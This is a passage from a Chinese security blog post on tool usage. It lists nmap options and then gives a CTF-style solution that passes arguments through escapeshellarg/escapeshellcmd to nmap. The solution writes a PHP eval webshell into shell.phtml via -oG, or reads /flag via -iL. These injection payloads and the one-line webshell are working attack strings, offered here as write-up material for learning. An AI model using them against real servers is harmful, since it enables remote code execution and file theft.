<li>-oX (XML输出)</li>
<li>-oS (ScRipT KIdd|3 oUTpuT)</li>
<li>-oG (Grep输出)</li>
<li>-oA (输出至所有格式)</li>
</ul>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-O：激活操作探测；</span></span><br><span class="line"><span class="deletion">-P0：值进行扫描，不ping主机；</span></span><br><span class="line"><span class="deletion">-PT：是同TCP的ping；</span></span><br><span class="line"><span class="deletion">-sV：探测服务版本信息；</span></span><br><span class="line"><span class="deletion">-sP：ping扫描，仅发现目标主机是否存活；</span></span><br><span class="line"><span class="deletion">-ps：发送同步（SYN）报文；</span></span><br><span class="line"><span class="deletion">-PU：发送udp ping；</span></span><br><span class="line"><span class="deletion">-PE：强制执行直接的ICMPping；</span></span><br><span class="line"><span class="deletion">-PB：默认模式，可以使用ICMPping和TCPping；</span></span><br><span class="line"><span class="deletion">-6：使用IPv6地址；</span></span><br><span class="line"><span class="deletion">-v：得到更多选项信息；</span></span><br><span class="line"><span class="deletion">-d：增加调试信息地输出；</span></span><br><span class="line"><span class="deletion">-oN：以人们可阅读的格式输出；</span></span><br><span class="line"><span class="deletion">-oX：以xml格式向指定文件输出信息；</span></span><br><span class="line"><span class="deletion">-oM：以机器可阅读的格式输出；</span></span><br><span class="line"><span class="deletion">-A：使用所有高级扫描选项；</span></span><br><span class="line"><span class="deletion">--resume：继续上次执行完的扫描；</span></span><br><span class="line"><span class="deletion">-P：指定要扫描的端口，可以是一个单独的端口，用逗号隔开多个端口，使用“-”表示端口范围；</span></span><br><span class="line"><span class="deletion">-e：在多网络接口Linux系统中，指定扫描使用的网络接口；</span></span><br><span class="line"><span class="deletion">-g：将指定的端口作为源端口进行扫描；</span></span><br><span class="line"><span class="deletion">--ttl：指定发送的扫描报文的生存期；</span></span><br><span class="line"><span class="deletion">--packet-trace：显示扫描过程中收发报文统计；</span></span><br><span class="line"><span class="deletion">--scanflags：设置在扫描报文中的TCP标志。</span></span><br><span class="line"><span class="deletion">--send-eth/--send-ip 使用原始以太网发送/构造指定IP发送</span></span><br></pre></td></tr></table></figure>

<p>知识点：</p>
<p>利用-oG，可以将命令和结果写进文件</p>
<p>利用-iL 和-oN</p>
<p>其中-iL是从inputfilename文件中读取扫描的目标。在这个文件中要有一个主机或者网络的列表，由空格</p>
<p>键、制表键或者回车键作为分割符。</p>
<p>如果使用-iL-，nmap就会从标准输入stdin读取主机名字。你可以从指定目标一节得到</p>
<p>更加详细的信息，-oN是把扫描结果重定向到一个可读的文件logfilename中。</p>
<p>这道题还有escapeshellarg和escapeshellcmd函数；</p>
<p>它绕过了PHP；一句话木马就可以使用短标签：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">?=</span> <span class="variable">@eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="string">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>文件格式就可以使用phtml</p>
<p>paload：</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">&#x27;  </span><span class="language-php"><span class="meta">&lt;?=</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><span class="language-xml"> -oG shell.phtml &#x27;</span></span><br></pre></td></tr></table></figure>

<p>方法二 -iL</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; -iL /flag -o 1 &#x27;</span><br></pre></td></tr></table></figure>


    </div>

    
    
    
      
  <div class="popular-posts-header">相关文章</div>
  <ul class="popular-posts">
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\tooluse(sqlmap)\" rel="bookmark">sqlmap使用总结</a></div>
    </li>
    <li class="popular-posts-item">
      <div class="popular-posts-title"><a href="\tooluse(bp-bruce)\" rel="bookmark">Burpsuite密码爆破</a></div>
    </li>
  </ul>


      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/tools/" rel="tag"># tools</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/Go/" rel="prev" title="golang">
      <i class="fa fa-chevron-left"></i> golang
    </a></div>
      <div class="post-nav-item">
    <a href="/tooluse(bp-bruce)/" rel="next" title="Burpsuite密码爆破">
      Burpsuite密码爆破 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">常用工具的使用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%EF%BC%89msf"><span class="nav-number">1.1.</span> <span class="nav-text">1）msf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%881%EF%BC%89msf%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="nav-number">1.1.1.</span> <span class="nav-text">（1）msf基本使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%882%EF%BC%89msf%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E6%A8%A1%E5%9D%97"><span class="nav-number">1.1.2.</span> <span class="nav-text">（2）msf后门生成模块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%99%AE%E9%80%9A%E7%94%9F%E6%88%90"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">普通生成</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%94%9F%E6%88%90"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">编码生成</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A5DC-3%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">*以DC-3举个例子</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#msf%E5%88%A9%E7%94%A8%E6%9C%A8%E9%A9%AC"><span class="nav-number">1.1.2.3.1.</span> <span class="nav-text">msf利用木马</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msfvenom-%E2%80%94list-archs"><span class="nav-number">1.1.2.4.</span> <span class="nav-text">msfvenom —list archs</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#msfvenom-%E2%80%94list-platforms"><span class="nav-number">1.1.2.5.</span> <span class="nav-text">msfvenom —list platforms</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%94%9F%E6%88%90%E6%A0%BC%E5%BC%8F"><span class="nav-number">1.1.2.6.</span> <span class="nav-text">常见生成格式</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1%E3%80%81-Windows"><span class="nav-number">1.1.2.6.1.</span> <span class="nav-text">1、 Windows</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2%E3%80%81Linux"><span class="nav-number">1.1.2.6.2.</span> <span class="nav-text">2、Linux</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3%E3%80%81Mac"><span class="nav-number">1.1.2.6.3.</span> <span class="nav-text">3、Mac</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4%E3%80%81Android"><span class="nav-number">1.1.2.6.4.</span> <span class="nav-text">4、Android</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5%E3%80%81Aspx"><span class="nav-number">1.1.2.6.5.</span> <span class="nav-text">5、Aspx</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#6%E3%80%81JSP"><span class="nav-number">1.1.2.6.6.</span> <span class="nav-text">6、JSP</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#7%E3%80%81PHP"><span class="nav-number">1.1.2.6.7.</span> <span class="nav-text">7、PHP</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#8%E3%80%81BASH"><span class="nav-number">1.1.2.6.8.</span> <span class="nav-text">8、BASH</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#9%E3%80%81Python"><span class="nav-number">1.1.2.6.9.</span> <span class="nav-text">9、Python</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Msfvenom%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0"><span class="nav-number">1.1.2.7.</span> <span class="nav-text">Msfvenom常用命令参数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%EF%BC%89hydra"><span class="nav-number">1.2.</span> <span class="nav-text">2）hydra</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%88%86%E7%A0%B4%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.爆破用户密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3%EF%BC%89cewl"><span class="nav-number">1.3.</span> <span class="nav-text">3）cewl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%EF%BC%89wpscan"><span class="nav-number">1.4.</span> <span class="nav-text">4）wpscan</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5%EF%BC%89John"><span class="nav-number">1.5.</span> <span class="nav-text">5）John</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6%EF%BC%89weevely"><span class="nav-number">1.6.</span> <span class="nav-text">6）weevely</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7%EF%BC%89whatweb"><span class="nav-number">1.7.</span> <span class="nav-text">7）whatweb</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8%EF%BC%89knockd"><span class="nav-number">1.8.</span> <span class="nav-text">8）knockd</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-knock%E5%91%BD%E4%BB%A4"><span class="nav-number">1.8.1.</span> <span class="nav-text">1&gt; knock命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-nc%E5%91%BD%E4%BB%A4"><span class="nav-number">1.8.2.</span> <span class="nav-text">2&gt;nc命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-openssl"><span class="nav-number">1.9.</span> <span class="nav-text">9)openssl</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SSL-%E7%AE%80%E4%BB%8B"><span class="nav-number">1.9.1.</span> <span class="nav-text">SSL 简介</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-gobuster"><span class="nav-number">1.10.</span> <span class="nav-text">10)gobuster</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E7%9B%AE%E5%BD%95"><span class="nav-number">1.10.1.</span> <span class="nav-text">爆破目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="nav-number">1.10.2.</span> <span class="nav-text">爆破子域名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-seed%E5%B7%A5%E5%85%B7php-mt-seed"><span class="nav-number">1.11.</span> <span class="nav-text">11)seed工具php_mt_seed</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-nmap"><span class="nav-number">1.12.</span> <span class="nav-text">12)nmap</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Ttoc"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">Ttoc</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">51</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/try-to-change" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;try-to-change" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:wejoke3@gmail.com" title="E-Mail → mailto:wejoke3@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2022 – 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ttoc</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>